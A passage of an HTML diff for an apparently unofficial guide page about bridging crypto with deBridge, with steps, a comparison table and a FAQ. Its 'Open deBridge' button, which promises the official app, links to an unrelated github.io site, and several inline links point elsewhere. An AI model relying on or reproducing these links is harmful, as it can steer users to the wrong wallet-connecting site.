href="https://www.gemini.com/cryptopedia/crypto-bridge-cross-chain-bridge" rel="noopener noreferrer">source transaction</a> created an order, and read the status shown for fulfillment or cancellation. Do not sign recovery transactions from random support links. Use only the official app and documentation, and compare the <a class="inline-link" href="https://www.coinbase.com/learn/crypto-basics/what-is-a-wallet" rel="noopener noreferrer">wallet address</a>, chain, order ID and refund asset before confirming any cancellation.</div></div></section>
+  <section class="section"><div class="container"><h2>How to bridge Crypto Bridge</h2><ol class="steps"><li><b>Open the app</b><span>Use the primary CTA to open app.debridge.com and connect the wallet you intend to send from.</span></li><li><b>Choose the route</b><span>Select the <a class="inline-link" href="https://docs.arbitrum.io/how-arbitrum-works/deep-dives/token-bridging" rel="noopener noreferrer">source chain</a>, source token, <a class="inline-link" href="https://ar5iv.labs.arxiv.org/html/2210.00264" rel="noopener noreferrer">destination chain</a>, destination token, and recipient wallet.</span></li><li><b>Review the quote</b><span>Check the expected output, network, token, route details, fees, limits, and recovery terms before signing.</span></li><li><b>Sign and track</b><span>Approve only the required wallet prompts, then monitor the order in the app or deExplorer.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official deBridge app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open deBridge ↗</a></div></div></section>
+  <section class="section"><div class="container"><h2>deBridge vs traditional crypto bridges</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>deBridge</th><th>Traditional bridge</th></tr></thead><tbody><tr><td>Architecture</td><td>0-TVL, solver-based execution through DLN</td><td>Often <a class="inline-link" href="https://docs.uniswap.org/concepts/protocol/liquidity-providers" rel="noopener noreferrer">shared liquidity pools</a> or lock-and-mint contracts</td></tr><tr><td>Asset flow</td><td>Per-order source contract and destination fulfillment</td><td>Varies by bridge design</td></tr><tr><td>Recovery</td><td>Docs describe cancellation and reclaim paths</td><td>Depends on bridge and message state</td></tr><tr><td>Best fit</td><td>Cross-chain swaps and executable outcomes</td><td>Simple transfers on supported canonical paths</td></tr></tbody></table></div></div></section>
+  <section class="section section-alt" id="faq"><div class="container"><h2>Crypto Bridge FAQ</h2><div class="faq-list"><details open><summary><h3>What is deBridge?</h3></summary><div>deBridge is a non-custodial execution layer for same-chain and cross-chain actions. It powers swaps, bridge-like transfers, messaging and execution workflows through the deBridge Liquidity Network. For users, that means the app can quote a source asset and destination outcome rather than only moving a <a class="inline-link" href="https://www.ledger.com/academy/whats-a-blockchain-bridge" rel="noopener noreferrer">wrapped token</a> from one chain to another.</div></details><details><summary><h3>Is deBridge a bridge or a DEX?</h3></summary><div>deBridge functions more like a cross-chain execution layer than a single-purpose bridge or DEX. It can handle same-chain swaps, cross-chain swaps and programmable actions. The user experience may look like a bridge because you choose a source and destination chain, but the underlying route can include solver liquidity and swaps.</div></details><details><summary><h3>What is the DBR token?</h3></summary><div>DBR is the token associated with deBridge. Market price, <a class="inline-link" href="https://www.coingecko.com/en/glossary/circulating-supply" rel="noopener noreferrer">circulating supply</a> and exchange listings should be checked on established data pages such as CoinGecko, while protocol mechanics should be checked in official deBridge resources. Do not trust DBR contract addresses posted in ads, replies or direct messages without verifying against official sources.</div></details><details><summary><h3>Can deBridge move USDC to Base?</h3></summary><div>Yes, Base is listed among supported deBridge chains, and USDC is described as a reserve asset across supported chains. Route availability still depends on the live app quote, source-chain liquidity and token form. Always verify whether the destination output is native USDC, bridged USDC or another representation before signing.</div></details><details><summary><h3>What happens if deBridge fails?</h3></summary><div>The deBridge docs state that if a transaction fails before an order is created, funds remain in the user's wallet. If an order is created but not fulfilled, users can cancel and reclaim tokens through the documented flow. The exact action depends on order status, so use the official app or order tracker before signing recovery transactions.</div></details><details><summary><h3>Does deBridge support Solana?</h3></summary><div>Yes. The official supported-chains documentation lists Solana along with EVM networks. Because Solana and EVM wallets have different address formats and signing flows, users should carefully check the recipient address and destination token in the live app before bridging or swapping across those ecosystems.</div></details></div></div></section>
 </main>
 <footer class="site-footer"><div class="container">
-<nav aria-label="Footer" class="footer-nav"><a href="#how-it-worked">How it worked</a><a href="#status">Status</a><a href="#fees-security">Fees security</a><a href="#historical-pieces">Historical pieces</a><a href="#verification-checks">Verification checks</a><a href="#faq">FAQ</a></nav>
-<p class="footer-note">Not the official CryptoBridge app — verify the domain before connecting a wallet. Information on this page is for educational purposes only and is not financial advice.</p>
-<p class="footer-meta"><a href="#top">Back to top ↑</a></p>
+  <div class="footer-grid"></div>
+  <p class="footer-note">Not the official app; verify app.debridge.com before connecting a wallet. Educational content only, not financial advice.</p>
+  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
 </div></footer>
-<script defer="" src="static/app.js"></script>
+<script src="static/app.js" defer></script>
 </body></html>
